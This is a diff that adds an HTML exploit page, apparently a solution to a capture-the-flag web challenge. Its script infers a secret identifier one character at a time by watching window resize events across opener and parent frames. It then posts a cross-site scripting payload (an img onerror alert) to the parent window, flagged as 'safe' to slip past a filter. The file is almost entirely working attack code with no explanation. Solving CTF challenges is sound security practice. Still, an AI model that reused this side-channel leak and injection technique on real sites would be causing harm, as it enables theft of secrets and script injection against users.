@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <link rel="icon" href="data:;base64,iVBORw0KGgo=" />
+  </head>
+  <body>
+    <script>
+      let lastHeight = 101;
+      let lastWidth = 101;
+      const chars = "0123456789abcdefghijklmnopqrstuvwxyz{".split("");
+      let solvedIdentifier = "";
+
+      let checks = 0;
+      let checksNeeded = 15;
+
+      function trySolve() {
+        try {
+          window.parent.postMessage(
+            {
+              type: "waf",
+              identifier: solvedIdentifier,
+              safe: true,
+              str: "<img src=x onerror=alert('flag{THIS_IS_THE_FLAG}')>",
+            },
+            "*"
+          );
+        } catch (e) {}
+      }
+
+      async function foundChar(char) {
+        console.log("FOUND CHAR: ", char);
+        solvedIdentifier = `${solvedIdentifier}${char}`;
+        console.log("TOTAL SOLVED", solvedIdentifier);
+        await window.parent.opener.opener.setIdentifier(`${solvedIdentifier}1`);
+
+        if (solvedIdentifier.length > 12) trySolve();
+      }
+
+      let locked = false;
+      setInterval(async () => {
+        const { innerHeight, innerWidth } = window;
+        if (innerHeight === lastHeight && innerWidth === lastWidth) {
+          return;
+        }
+        checks++;
+        if (checks < checksNeeded || checks % checksNeeded !== 0) {
+          return;
+        }
+        const currentIdentifier = window.parent.opener.opener.getIdentifier();
+
+        if (solvedIdentifier.length >= currentIdentifier.length) {
+          return;
+        }
+
+        const currentChar = currentIdentifier.substr(-1);
+        const targetedChar = chars[chars.indexOf(currentChar) - 1];
+        if (!targetedChar) return;
+        const nextChar = chars[chars.indexOf(currentChar) + 1];
+
+        console.log("currentIdentifier:", currentIdentifier);
+        console.log("currentChar:", currentChar);
+        console.log("targetedChar:", targetedChar);
+        console.log("nextChar:", nextChar);
+
+        if (innerWidth > lastWidth) {
+          setTimeout(() => (locked = false), 1000);
+          if (!locked) {
+            locked = true;
+            lastWidth = innerWidth + 100;
+            await foundChar(targetedChar);
+          }
+          return;
+        }
+
+        if (innerHeight > lastHeight) {
+          locked = false;
+
+          await window.parent.opener.opener.setIdentifier(
+            `${solvedIdentifier}${nextChar}`
+          );
+          lastWidth = innerWidth;
+          lastHeight = innerHeight;
+        }
+      }, 100);
+    </script>
+  </body>
+</html>
